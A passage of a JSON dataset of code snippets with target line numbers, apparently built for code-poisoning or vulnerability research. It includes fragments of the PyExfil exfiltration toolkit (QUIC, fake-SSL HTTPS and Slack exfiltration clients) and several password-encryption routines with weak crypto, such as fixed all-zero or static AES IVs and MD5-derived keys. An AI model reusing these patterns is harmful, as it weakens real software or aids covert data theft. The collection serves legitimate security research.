      "        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')\n",
      "\n",
      "    def _pad(self, s):\n",
      "        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)\n",
      "\n",
      "    @staticmethod\n",
      "    def _unpad(s):\n",
      "        return s[:-ord(s[len(s)-1:])]\n",
      "\n",
      "\n",
      "class QUICClient():\n",
      "\n",
      "    def __init__(self, host, key, port=443, max_size=4096):\n",
      "\n",
      "        # Params for all class\n",
      "        self.host = host\n",
      "        self.port = port\n",
      "        self.max_size = max_size - 60\n",
      "        self.AESDriver = AESCipher(key=key)\n",
      "        self.serv_addr = (host, port)\n",
      "\n",
      "        # Class Globals\n",
      "        self.max_packets = 255 # Limitation by QUIC itself.\n",
      "        self._genSeq()   # QUIC Sequence is used to know that this is the same sequence,\n",
      "                          # and it's a 20 byte long that is kept the same through out the\n",
      "                          # session and is transfered hex encoded.\n",
      "        self.delay = 0.1\n",
      "\n",
      "        self.sock = None\n",
      "        if self._createSocket() is 1:               # Creating a UDP socket object\n",
      "            sys.exit(1)\n",
      "        self.serv_addr = (self.host, self.port)     # Creating socket addr format\n",
      "\n",
      "    def _genSeq(self):\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/ytisf/PyExfil/pyexfil/network/QUIC/quic_client.py",
    "code": [
      "import hashlib\n",
      "import urllib2\n",
      "\n",
      "from Crypto import Random\n",
      "from Crypto.Cipher import AES\n",
      "\n",
      "# from itertools import izip_longest\n",
      "\n",
      "# Setting timeout so that we won't wait forever\n",
      "timeout = 2\n",
      "socket.setdefaulttimeout(timeout)\n",
      "limit = 256*256*256*256 - 1\n",
      "\n",
      "\n",
      "def md5(fname):\n",
      "    hash_md5 = hashlib.md5()\n",
      "    with open(fname, \"rb\") as f:\n",
      "        for chunk in iter(lambda: f.read(4096), b\"\"):\n",
      "            hash_md5.update(chunk)\n",
      "    return hash_md5.hexdigest()\n",
      "\n",
      "def chunkstring(s, n):\n",
      "    return [ s[i:i+n] for i in xrange(0, len(s), n) ]\n",
      "\n",
      "\n",
      "class AESCipher(object):\n",
      "\n",
      "    def __init__(self, key):\n",
      "        self.bs = 32\n",
      "        self.key = hashlib.sha256(key.encode()).digest()\n",
      "\n",
      "    def encrypt(self, raw):\n",
      "        raw = self._pad(raw)\n",
      "        iv = Random.new().read(AES.block_size)\n",
      "        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n",
      "        return iv + cipher.encrypt(raw)\n",
      "\n",
      "    def decrypt(self, enc):\n",
      "        # enc = base64.b64decode(enc)\n",
      "        iv = enc[:AES.block_size]\n",
      "        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n",
      "        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')\n",
      "\n",
      "    def _pad(self, s):\n",
      "        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)\n",
      "\n",
      "    @staticmethod\n",
      "    def _unpad(s):\n",
      "        return s[:-ord(s[len(s)-1:])]\n",
      "\n",
      "\n",
      "class QUICClient():\n",
      "\n",
      "    def __init__(self, host, key, port=443, max_size=4096):\n",
      "\n",
      "        # Params for all class\n",
      "        self.host = host\n",
      "        self.port = port\n",
      "        self.max_size = max_size - 60\n",
      "        self.AESDriver = AESCipher(key=key)\n",
      "        self.serv_addr = (host, port)\n",
      "\n",
      "        # Class Globals\n",
      "        self.max_packets = 255 # Limitation by QUIC itself.\n",
      "        self._genSeq()   # QUIC Sequence is used to know that this is the same sequence,\n",
      "                          # and it's a 20 byte long that is kept the same through out the\n",
      "                          # session and is transfered hex encoded.\n",
      "        self.delay = 0.1\n",
      "\n",
      "        self.sock = None\n",
      "        if self._createSocket() is 1:               # Creating a UDP socket object\n",
      "            sys.exit(1)\n",
      "        self.serv_addr = (self.host, self.port)     # Creating socket addr format\n",
      "\n",
      "    def _genSeq(self):\n",
      "        self.raw_sequence = random.getrandbits(64)\n",
      "        parts = []\n",
      "        while self.raw_sequence:\n",
      "            parts.append(self.raw_sequence & limit)\n",
      "            self.raw_sequence >>= 32\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/ytisf/PyExfil/pyexfil/network/HTTPS/https_client.py",
    "code": [
      "\n",
      "import ssl\n",
      "import sys\n",
      "import time\n",
      "import socket\n",
      "import hashlib\n",
      "import urllib2\n",
      "\n",
      "from Crypto import Random\n",
      "from Crypto.Cipher import AES\n",
      "\n",
      "from itertools import izip_longest\n",
      "\n",
      "# Setting timeout so that we won't wait forever\n",
      "timeout = 2\n",
      "socket.setdefaulttimeout(timeout)\n",
      "\n",
      "if sys.version_info.major == 3:\n",
      "    xrange = range\n",
      "elif sys.version_info.major == 2:\n",
      "    xrange = xrange\n",
      "else:\n",
      "    # In the distant future, the year 2000...\n",
      "    sys.exit()\n",
      "\n",
      "\n",
      "def chunkstring(s, n):\n",
      "    return [ s[i:i+n] for i in xrange(0, len(s), n) ]\n",
      "\n",
      "class AESCipher(object):\n",
      "\n",
      "    def __init__(self, key):\n",
      "        self.bs = 32\n",
      "        self.key = hashlib.sha256(key.encode()).digest()\n",
      "\n",
      "    def encrypt(self, raw):\n",
      "        raw = self._pad(raw)\n",
      "        iv = Random.new().read(AES.block_size)\n",
      "        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n",
      "        return iv + cipher.encrypt(raw)\n",
      "\n",
      "    def decrypt(self, enc):\n",
      "        # enc = base64.b64decode(enc)\n",
      "        iv = enc[:AES.block_size]\n",
      "        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n",
      "        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')\n",
      "\n",
      "    def _pad(self, s):\n",
      "        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)\n",
      "\n",
      "    @staticmethod\n",
      "    def _unpad(s):\n",
      "        return s[:-ord(s[len(s)-1:])]\n",
      "\n",
      "\n",
      "class HTTPSExfiltrationClient():\n",
      "\n",
      "    def __init__(self, host, key, port=443, max_size=8192):\n",
      "        self.host = host\n",
      "        self.port = port\n",
      "        self.max_size = max_size\n",
      "        self.AESDriver = AESCipher(key=key)\n",
      "\n",
      "        self.sock = None\n",
      "\n",
      "        # Initiate the socket\n",
      "        check = self._pretendSSL()\n",
      "        if check is not 0:\n",
      "            sys.exit(1)\n",
      "        check = self._createRealSocket()\n",
      "        if check is not 0:\n",
      "            sys.exit(1)\n",
      "\n",
      "\n",
      "    def _pretendSSL(self):\n",
      "        try:\n",
      "            response = urllib2.urlopen('https://%s:%s/' % (self.host, self.port))\n",
      "            html = response.read()\n",
      "        except urllib2.URLError as e:\n",
      "            return 0\n",
      "        except socket.error as e:\n"
    ],
    "target": 38,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/ytisf/PyExfil/pyexfil/network/HTTPS/https_client.py",
    "code": [
      "import socket\n",
      "import hashlib\n",
      "import urllib2\n",
      "\n",
      "from Crypto import Random\n",
      "from Crypto.Cipher import AES\n",
      "\n",
      "from itertools import izip_longest\n",
      "\n",
      "# Setting timeout so that we won't wait forever\n",
      "timeout = 2\n",
      "socket.setdefaulttimeout(timeout)\n",
      "\n",
      "if sys.version_info.major == 3:\n",
      "    xrange = range\n",
      "elif sys.version_info.major == 2:\n",
      "    xrange = xrange\n",
      "else:\n",
      "    # In the distant future, the year 2000...\n",
      "    sys.exit()\n",
      "\n",
      "\n",
      "def chunkstring(s, n):\n",
      "    return [ s[i:i+n] for i in xrange(0, len(s), n) ]\n",
      "\n",
      "class AESCipher(object):\n",
      "\n",
      "    def __init__(self, key):\n",
      "        self.bs = 32\n",
      "        self.key = hashlib.sha256(key.encode()).digest()\n",
      "\n",
      "    def encrypt(self, raw):\n",
      "        raw = self._pad(raw)\n",
      "        iv = Random.new().read(AES.block_size)\n",
      "        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n",
      "        return iv + cipher.encrypt(raw)\n",
      "\n",
      "    def decrypt(self, enc):\n",
      "        # enc = base64.b64decode(enc)\n",
      "        iv = enc[:AES.block_size]\n",
      "        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n",
      "        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')\n",
      "\n",
      "    def _pad(self, s):\n",
      "        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)\n",
      "\n",
      "    @staticmethod\n",
      "    def _unpad(s):\n",
      "        return s[:-ord(s[len(s)-1:])]\n",
      "\n",
      "\n",
      "class HTTPSExfiltrationClient():\n",
      "\n",
      "    def __init__(self, host, key, port=443, max_size=8192):\n",
      "        self.host = host\n",
      "        self.port = port\n",
      "        self.max_size = max_size\n",
      "        self.AESDriver = AESCipher(key=key)\n",
      "\n",
      "        self.sock = None\n",
      "\n",
      "        # Initiate the socket\n",
      "        check = self._pretendSSL()\n",
      "        if check is not 0:\n",
      "            sys.exit(1)\n",
      "        check = self._createRealSocket()\n",
      "        if check is not 0:\n",
      "            sys.exit(1)\n",
      "\n",
      "\n",
      "    def _pretendSSL(self):\n",
      "        try:\n",
      "            response = urllib2.urlopen('https://%s:%s/' % (self.host, self.port))\n",
      "            html = response.read()\n",
      "        except urllib2.URLError as e:\n",
      "            return 0\n",
      "        except socket.error as e:\n",
      "            sys.stderr.write(\"[!]\\tCould not reach server to fake SSL handshake!\\n\")\n",
      "            return 1\n",
      "        except ssl.CertificateError:\n",
      "            # Certificates does not match\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/ytisf/PyExfil/pyexfil/network/Slack/slack_server.py",
    "code": [
      "#!/usr/bin/python\n",
      "\n",
      "import os\n",
      "import sys\n",
      "import random\n",
      "import base64\n",
      "import hashlib\n",
      "\n",
      "from Crypto import Random\n",
      "from Crypto.Cipher import AES\n",
      "from slackclient import SlackClient\n",
      "\n",
      "# CONSTANTS\n",
      "POST_MESSAGE = \"chat.postMessage\"\n",
      "\n",
      "\n",
      "def md5(fname):\n",
      "    hash_md5 = hashlib.md5()\n",
      "    with open(fname, \"rb\") as f:\n",
      "        for chunk in iter(lambda: f.read(4096), b\"\"):\n",
      "            hash_md5.update(chunk)\n",
      "    return hash_md5.hexdigest()\n",
      "\n",
      "class AESCipher(object):\n",
      "\n",
      "    def __init__(self, key):\n",
      "        self.bs = 32\n",
      "        self.key = hashlib.sha256(key.encode()).digest()\n",
      "\n",
      "    def encrypt(self, raw):\n",
      "        raw = self._pad(raw)\n",
      "        iv = Random.new().read(AES.block_size)\n",
      "        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n",
      "        return iv + cipher.encrypt(raw)\n",
      "\n",
      "    def decrypt(self, enc):\n",
      "        # enc = base64.b64decode(enc)\n",
      "        iv = enc[:AES.block_size]\n",
      "        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n",
      "        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')\n",
      "\n",
      "    def _pad(self, s):\n",
      "        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)\n",
      "\n",
      "    @staticmethod\n",
      "    def _unpad(s):\n",
      "        return s[:-ord(s[len(s)-1:])]\n",
      "\n",
      "\n",
      "class SlackExfiltrator():\n",
      "    def __init__(self, slackSlaveID, slackToken, encKey):\n",
      "        self.slackSlaveID = slackSlaveID\n",
      "        self.slackToken = slackToken\n",
      "        self.encKey = encKey\n",
      "\n",
      "        self.encDriver = AESCipher(key=self.encKey)\n",
      "        self.slackObj = None\n",
      "\n",
      "    def _connect2Slack(self):\n",
      "        self.slackObj = SlackClient(self.slackToken)\n",
      "\n",
      "        if self.slackObj.api_call(\"api.test\")['ok'] == True:\n",
      "            sys.stdout.write(\"[+]\\tConnected to Slack. API is valid!\\n\")\n",
      "            return True\n",
      "\n",
      "        else:\n",
      "            sys.stderr.write(\"Unable to connect to slack. Maybe token is wrong?\\n\")\n",
      "            sys.stderr.write(\"%s\\n\" % self.slackObj.api_call(\"api.test\")['error'])\n",
      "            sys.exit(1)\n",
      "\n",
      "    def Listen(self):\n",
      "        SC.api_call(\"chat.postMessage\", as_user=True, channel=self.slackSlaveID, text=\"Bot is now online and will accept your calls.\")\n",
      "        if SC.rtm_connect():\n",
      "            while True:\n",
      "                answer = SC.rtm_read()\n",
      "                try:\n",
      "                    answer = answer[0]\n",
      "                except IndexError:\n",
      "                    continue\n",
      "\n",
      "                try:\n"
    ],
    "target": 32,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/ytisf/PyExfil/pyexfil/network/Slack/slack_server.py",
    "code": [
      "#!/usr/bin/python\n",
      "\n",
      "import os\n",
      "import sys\n",
      "import random\n",
      "import base64\n",
      "import hashlib\n",
      "\n",
      "from Crypto import Random\n",
      "from Crypto.Cipher import AES\n",
      "from slackclient import SlackClient\n",
      "\n",
      "# CONSTANTS\n",
      "POST_MESSAGE = \"chat.postMessage\"\n",
      "\n",
      "\n",
      "def md5(fname):\n",
      "    hash_md5 = hashlib.md5()\n",
      "    with open(fname, \"rb\") as f:\n",
      "        for chunk in iter(lambda: f.read(4096), b\"\"):\n",
      "            hash_md5.update(chunk)\n",
      "    return hash_md5.hexdigest()\n",
      "\n",
      "class AESCipher(object):\n",
      "\n",
      "    def __init__(self, key):\n",
      "        self.bs = 32\n",
      "        self.key = hashlib.sha256(key.encode()).digest()\n",
      "\n",
      "    def encrypt(self, raw):\n",
      "        raw = self._pad(raw)\n",
      "        iv = Random.new().read(AES.block_size)\n",
      "        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n",
      "        return iv + cipher.encrypt(raw)\n",
      "\n",
      "    def decrypt(self, enc):\n",
      "        # enc = base64.b64decode(enc)\n",
      "        iv = enc[:AES.block_size]\n",
      "        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n",
      "        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')\n",
      "\n",
      "    def _pad(self, s):\n",
      "        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)\n",
      "\n",
      "    @staticmethod\n",
      "    def _unpad(s):\n",
      "        return s[:-ord(s[len(s)-1:])]\n",
      "\n",
      "\n",
      "class SlackExfiltrator():\n",
      "    def __init__(self, slackSlaveID, slackToken, encKey):\n",
      "        self.slackSlaveID = slackSlaveID\n",
      "        self.slackToken = slackToken\n",
      "        self.encKey = encKey\n",
      "\n",
      "        self.encDriver = AESCipher(key=self.encKey)\n",
      "        self.slackObj = None\n",
      "\n",
      "    def _connect2Slack(self):\n",
      "        self.slackObj = SlackClient(self.slackToken)\n",
      "\n",
      "        if self.slackObj.api_call(\"api.test\")['ok'] == True:\n",
      "            sys.stdout.write(\"[+]\\tConnected to Slack. API is valid!\\n\")\n",
      "            return True\n",
      "\n",
      "        else:\n",
      "            sys.stderr.write(\"Unable to connect to slack. Maybe token is wrong?\\n\")\n",
      "            sys.stderr.write(\"%s\\n\" % self.slackObj.api_call(\"api.test\")['error'])\n",
      "            sys.exit(1)\n",
      "\n",
      "    def Listen(self):\n",
      "        SC.api_call(\"chat.postMessage\", as_user=True, channel=self.slackSlaveID, text=\"Bot is now online and will accept your calls.\")\n",
      "        if SC.rtm_connect():\n",
      "            while True:\n",
      "                answer = SC.rtm_read()\n",
      "                try:\n",
      "                    answer = answer[0]\n",
      "                except IndexError:\n",
      "                    continue\n",
      "\n",
      "                try:\n"
    ],
    "target": 38,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/rleadbetter/Sick-Beard/lib/hachoir_parser/misc/gnome_keyring.py",
    "code": [
      "\"\"\"\n",
      "Gnome keyring parser.\n",
      "\n",
      "Sources:\n",
      " - Gnome Keyring source code,\n",
      "   function generate_file() in keyrings/gkr-keyring.c,\n",
      "\n",
      "Author: Victor Stinner\n",
      "Creation date: 2008-04-09\n",
      "\"\"\"\n",
      "\n",
      "from lib.hachoir_core.tools import paddingSize\n",
      "from lib.hachoir_parser import Parser\n",
      "from lib.hachoir_core.field import (FieldSet,\n",
      "    Bit, NullBits, NullBytes,\n",
      "    UInt8, UInt32, String, RawBytes, Enum,\n",
      "    TimestampUnix64, CompressedField,\n",
      "    SubFile)\n",
      "from lib.hachoir_core.endian import BIG_ENDIAN\n",
      "\n",
      "try:\n",
      "    import hashlib\n",
      "    def sha256(data):\n",
      "        hash = hashlib.new('sha256')\n",
      "        hash.update(data)\n",
      "        return hash.digest()\n",
      "except ImportError:\n",
      "    def sha256(data):\n",
      "        raise ImportError(\"hashlib module is missing\")\n",
      "\n",
      "try:\n",
      "    from Crypto.Cipher import AES\n",
      "    class DeflateStream:\n",
      "        def __init__(self, stream):\n",
      "            hash_iterations = 1234\n",
      "            password = \"x\" * 8\n",
      "            salt = \"\\0\" * 8\n",
      "            key, iv = generate_key(password, salt, hash_iterations)\n",
      "            self.cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "\n",
      "        def __call__(self, size, data=None):\n",
      "            if data is None:\n",
      "                return ''\n",
      "            return self.cipher.decrypt(data)\n",
      "\n",
      "    def Deflate(field):\n",
      "        CompressedField(field, DeflateStream)\n",
      "        return field\n",
      "except ImportError:\n",
      "    def Deflate(field):\n",
      "        return field\n",
      "\n",
      "class KeyringString(FieldSet):\n",
      "    def createFields(self):\n",
      "        yield UInt32(self, \"length\")\n",
      "        length = self[\"length\"].value\n",
      "        if length == 0xffffffff:\n",
      "            return\n",
      "        yield String(self, \"text\", length, charset=\"UTF-8\")\n",
      "\n",
      "    def createValue(self):\n",
      "        if \"text\" in self:\n",
      "            return self[\"text\"].value\n",
      "        else:\n",
      "            return u''\n",
      "\n",
      "    def createDescription(self):\n",
      "        if \"text\" in self:\n",
      "            return self[\"text\"].value\n",
      "        else:\n",
      "            return u\"(empty string)\"\n",
      "\n",
      "class Attribute(FieldSet):\n",
      "    def createFields(self):\n",
      "        yield KeyringString(self, \"name\")\n",
      "        yield UInt32(self, \"type\")\n",
      "        type = self[\"type\"].value\n",
      "        if type == 0:\n",
      "            yield KeyringString(self, \"value\")\n",
      "        elif type == 1:\n",
      "            yield UInt32(self, \"value\")\n"
    ],
    "target": 38,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/prometheanfire/openstack-guest-agents-unix/commands/password.py",
    "code": [
      "        Create a private key using /dev/urandom\n",
      "        \"\"\"\n",
      "\n",
      "        return int(binascii.hexlify(os.urandom(16)), 16)\n",
      "\n",
      "    def _dh_compute_public_key(self, private_key):\n",
      "        \"\"\"\n",
      "        Given a private key, compute a public key\n",
      "        \"\"\"\n",
      "\n",
      "        return self._mod_exp(self.base, private_key, self.prime)\n",
      "\n",
      "    def _dh_compute_shared_key(self, public_key, private_key):\n",
      "        \"\"\"\n",
      "        Given public and private keys, compute the shared key\n",
      "        \"\"\"\n",
      "\n",
      "        return self._mod_exp(public_key, private_key, self.prime)\n",
      "\n",
      "    def _compute_aes_key(self, key):\n",
      "        \"\"\"\n",
      "        Given a key, compute the corresponding key that can be used\n",
      "        with AES\n",
      "        \"\"\"\n",
      "\n",
      "        m = hashlib.md5()\n",
      "        m.update(key)\n",
      "\n",
      "        aes_key = m.digest()\n",
      "\n",
      "        m = hashlib.md5()\n",
      "        m.update(aes_key)\n",
      "        m.update(key)\n",
      "\n",
      "        aes_iv = m.digest()\n",
      "\n",
      "        return (aes_key, aes_iv)\n",
      "\n",
      "    def _decrypt_password(self, aes_key, data):\n",
      "\n",
      "        aes = AES.new(aes_key[0], AES.MODE_CBC, aes_key[1])\n",
      "        passwd = aes.decrypt(data)\n",
      "\n",
      "        cut_off_sz = ord(passwd[len(passwd) - 1])\n",
      "        if cut_off_sz > 16 or len(passwd) < 16:\n",
      "            raise PasswordError((500, \"Invalid password data received\"))\n",
      "\n",
      "        passwd = passwd[: - cut_off_sz]\n",
      "\n",
      "        return passwd\n",
      "\n",
      "    def _decode_password(self, data):\n",
      "\n",
      "        try:\n",
      "            real_data = base64.b64decode(data)\n",
      "        except Exception:\n",
      "            raise PasswordError((500, \"Couldn't decode base64 data\"))\n",
      "\n",
      "        try:\n",
      "            aes_key = self.aes_key\n",
      "        except AttributeError:\n",
      "            raise PasswordError((500, \"Password without key exchange\"))\n",
      "\n",
      "        try:\n",
      "            passwd = self._decrypt_password(aes_key, real_data)\n",
      "        except PasswordError, e:\n",
      "            raise e\n",
      "        except Exception, e:\n",
      "            raise PasswordError((500, str(e)))\n",
      "\n",
      "        return passwd\n",
      "\n",
      "    def _change_password(self, passwd):\n",
      "        \"\"\"Actually change the password\"\"\"\n",
      "\n",
      "        if self.kwargs.get('testmode', False):\n",
      "            return None\n",
      "        # Make sure there are no newlines at the end\n",
      "        set_password('root', passwd.strip('\\n'))\n",
      "\n",
      "    def _wipe_key(self):\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/wyatt88/jumpserver/jumpserver/api.py",
    "code": [
      "\n",
      "def page_list_return(total, current=1):\n",
      "    min_page = current - 2 if current - 4 > 0 else 1\n",
      "    max_page = min_page + 4 if min_page + 4 < total else total\n",
      "\n",
      "    return range(min_page, max_page+1)\n",
      "\n",
      "\n",
      "def pages(posts, r):\n",
      "    \"\"\"分页公用函数\"\"\"\n",
      "    contact_list = posts\n",
      "    p = paginator = Paginator(contact_list, 10)\n",
      "    try:\n",
      "        current_page = int(r.GET.get('page', '1'))\n",
      "    except ValueError:\n",
      "        current_page = 1\n",
      "\n",
      "    page_range = page_list_return(len(p.page_range), current_page)\n",
      "\n",
      "    try:\n",
      "        contacts = paginator.page(current_page)\n",
      "    except (EmptyPage, InvalidPage):\n",
      "        contacts = paginator.page(paginator.num_pages)\n",
      "\n",
      "    if current_page >= 5:\n",
      "        show_first = 1\n",
      "    else:\n",
      "        show_first = 0\n",
      "    if current_page <= (len(p.page_range) - 3):\n",
      "        show_end = 1\n",
      "    else:\n",
      "        show_end = 0\n",
      "\n",
      "    return contact_list, p, contacts, page_range, current_page, show_first, show_end\n",
      "\n",
      "\n",
      "class PyCrypt(object):\n",
      "    \"\"\"This class used to encrypt and decrypt password.\"\"\"\n",
      "\n",
      "    def __init__(self, key):\n",
      "        self.key = key\n",
      "        self.mode = AES.MODE_CBC\n",
      "\n",
      "    def encrypt(self, text):\n",
      "        cryptor = AES.new(self.key, self.mode, b'0000000000000000')\n",
      "        length = 16\n",
      "        try:\n",
      "            count = len(text)\n",
      "        except TypeError:\n",
      "            raise ServerError('Encrypt password error, TYpe error.')\n",
      "        add = (length - (count % length))\n",
      "        text += ('\\0' * add)\n",
      "        ciphertext = cryptor.encrypt(text)\n",
      "        return b2a_hex(ciphertext)\n",
      "\n",
      "    def decrypt(self, text):\n",
      "        cryptor = AES.new(self.key, self.mode, b'0000000000000000')\n",
      "        try:\n",
      "            plain_text = cryptor.decrypt(a2b_hex(text))\n",
      "        except TypeError:\n",
      "            raise ServerError('Decrypt password error, TYpe error.')\n",
      "        return plain_text.rstrip('\\0')\n",
      "\n",
      "\n",
      "CRYPTOR = PyCrypt(KEY)\n",
      "\n",
      "\n",
      "class ServerError(Exception):\n",
      "    pass\n",
      "\n",
      "\n",
      "def get_object(model, **kwargs):\n",
      "    try:\n",
      "        the_object = model.objects.get(**kwargs)\n",
      "    except ObjectDoesNotExist:\n",
      "        raise ServerError('Object get %s failed.' % str(kwargs.values()))\n",
      "    return the_object\n",
      "\n",
      "\n",
      "def require_login(func):\n",
      "    \"\"\"要求登录的装饰器\"\"\"\n",
      "    def _deco(request, *args, **kwargs):\n",
      "        if not request.session.get('user_id'):\n"
    ],
    "target": 40,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/UAlbanyArchives/ants/ants.py",
    "code": [
      "\t\tloginGrid.Add( self.userText, 0, wx.ALL|wx.ALIGN_LEFT, 5 )\n",
      "\t\tself.enterUser = wx.TextCtrl( loginDialog, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )\n",
      "\t\tself.enterUser.SetLabel(emptyLogin)\n",
      "\t\tloginGrid.Add( self.enterUser, 0, wx.ALL, 5 )\n",
      "\t\tself.pwText = wx.StaticText( loginDialog, wx.ID_ANY, u\"Password:\", wx.DefaultPosition, wx.DefaultSize, 0 )\n",
      "\t\tself.pwText.Wrap( -1 )\n",
      "\t\tloginGrid.Add( self.pwText, 0, wx.ALL|wx.ALIGN_LEFT, 5 )\n",
      "\t\tself.enterPassword = wx.TextCtrl( loginDialog, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, wx.TE_PASSWORD|wx.TE_PROCESS_ENTER)\n",
      "\t\tself.enterPassword.SetLabel(emptyPw)\n",
      "\t\tloginGrid.Add( self.enterPassword, 0, wx.ALL, 5 )\n",
      "\t\tloginGrid.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )\n",
      "\t\tself.rememberBox = wx.CheckBox( loginDialog, wx.ID_ANY, u\"Remember Me\", wx.DefaultPosition, wx.DefaultSize, 0 )\n",
      "\t\tloginGrid.Add( self.rememberBox, 0, wx.ALL, 5 )\n",
      "\t\tloginSizer.Add( loginGrid, 1, wx.ALIGN_CENTER_HORIZONTAL, 5 )\n",
      "\t\tbuttonSizer = wx.BoxSizer( wx.VERTICAL )\n",
      "\t\tself.loginButton = wx.Button( loginDialog, wx.ID_ANY, u\"Login\", wx.DefaultPosition, wx.DefaultSize, 0 )\n",
      "\t\tself.loginButton.Bind(wx.EVT_BUTTON, onLogin)\n",
      "\t\tbuttonSizer.Add( self.loginButton, 0, wx.ALL|wx.ALIGN_CENTER_HORIZONTAL, 5 )\n",
      "\t\tloginSizer.Add( buttonSizer, 1, 5 )\n",
      "\t\tif len(emptyLogin) < 1:\n",
      "\t\t\tself.enterUser.SetFocus()\n",
      "\t\telif len(emptyPw) < 1:\n",
      "\t\t\tself.enterPassword.SetFocus()\n",
      "\t\telse:\n",
      "\t\t\tself.loginButton.SetFocus()\n",
      "\t\tloginDialog.SetSizer(loginSizer)\n",
      "\t\tresult = loginDialog.ShowModal()\n",
      "\t\tif self.rememberBox.IsChecked():\n",
      "\t\t\ttry:\n",
      "\t\t\t\tconfigXML = os.path.join(self.appData, \"config.xml\")\n",
      "\t\t\t\tparser = ET.XMLParser(remove_blank_text=True)\n",
      "\t\t\t\tconfigParse = ET.parse(configXML, parser)\n",
      "\t\t\t\tconfig = configParse.getroot()\n",
      "\t\t\t\tif config.find(\"login\").attrib[\"store\"].lower() == \"true\":\n",
      "\t\t\t\t\tconfig.find(\"login\").text = self.enterUser.GetValue()\n",
      "\t\t\t\t\ttry:\n",
      "\t\t\t\t\t\tself.loginInput.SetLabel(self.enterUser.GetValue())\n",
      "\t\t\t\t\texcept:\n",
      "\t\t\t\t\t\tpass\n",
      "\t\t\t\tif config.find(\"pw\").attrib[\"store\"].lower() == \"true\":\n",
      "\t\t\t\t\tpwd = AES.new(self.phrase1, AES.MODE_CFB, self.phrase2)\n",
      "\t\t\t\t\tpwd2 = pwd.encrypt(self.enterPassword.GetValue())\n",
      "\t\t\t\t\tconfig.find('pw').text = binascii.hexlify(pwd2)\n",
      "\t\t\t\t\ttry:\n",
      "\t\t\t\t\t\tself.passwordInput.SetLabel(self.enterPassword.GetValue())\n",
      "\t\t\t\t\texcept:\n",
      "\t\t\t\t\t\tpass\n",
      "\t\t\t\tconfigString = ET.tostring(config, pretty_print=True)\n",
      "\t\t\t\tfile = open(os.path.join(self.appData, \"config.xml\"), \"w\")\n",
      "\t\t\t\tfile.write(configString)\n",
      "\t\t\t\tfile.close()\n",
      "\t\t\texcept:\n",
      "\t\t\t\tpass\n",
      "\t\tlogin = self.enterUser.GetValue()\n",
      "\t\tpw = self.enterPassword.GetValue()\n",
      "\t\treturn login, pw\n",
      "\t\t\n",
      "\tdef stopLogin(self, event):\n",
      "\t\tprint \"Google login aborted\"\n",
      "\t\tself.t_stop.set()\n",
      "\t\tself.childFrame.Destroy()\n",
      "\n",
      "\n",
      "##############################################################################################################################\n",
      "\n",
      "class CreditsFrame ( wx.Frame ):\n",
      "\t\n",
      "\tdef __init__( self, parent ):\n",
      "\t\twx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = u\"ANTS Credits\", pos = wx.DefaultPosition, size = wx.Size( 500,300 ), style = wx.DEFAULT_FRAME_STYLE|wx.TAB_TRAVERSAL )\n",
      "\t\t\n",
      "\t\tself.SetSizeHintsSz( wx.DefaultSize, wx.DefaultSize )\n",
      "\t\t\n",
      "\t\tbSizer1 = wx.BoxSizer( wx.VERTICAL )\n",
      "\t\t\n",
      "\t\tself.m_panel1 = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )\n",
      "\t\tbSizer2 = wx.BoxSizer( wx.VERTICAL )\n",
      "\t\t\n",
      "\t\tself.m_staticText3 = wx.StaticText( self.m_panel1, wx.ID_ANY, u\"ANTS uses the following tools/scripts:\", wx.DefaultPosition, wx.DefaultSize, 0 )\n",
      "\t\tself.m_staticText3.Wrap( -1 )\n",
      "\t\tbSizer2.Add( self.m_staticText3, 0, wx.ALL, 5 )\n",
      "\t\t\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/jackuess/pirateplay/services.py",
    "code": [
      "from urllib import unquote\n",
      "import re\n",
      "import httplib\n",
      "from pyamf import remoting\n",
      "\n",
      "def fix_playpath(url):\n",
